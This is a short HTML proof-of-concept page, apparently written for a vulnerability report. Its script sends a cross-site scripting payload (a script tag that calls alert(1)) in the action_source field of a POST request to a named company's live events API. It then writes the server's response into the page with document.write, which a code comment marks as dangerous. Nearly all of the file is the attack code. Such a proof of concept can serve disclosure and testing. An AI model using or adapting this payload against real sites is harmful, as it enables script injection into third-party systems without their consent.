<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC</title>
</head>
<body>
    <script>
        fetch('https://www.chatrwireless.com/api/capi/events/v1', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                action_source: 'test"><script>alert(1)</script>'
            })
        })
        .then(response => response.text())
        .then(data => {
            document.write(data); // Dangerous: Writing untrusted data to the document
        });
    </script>
</body>
</html>
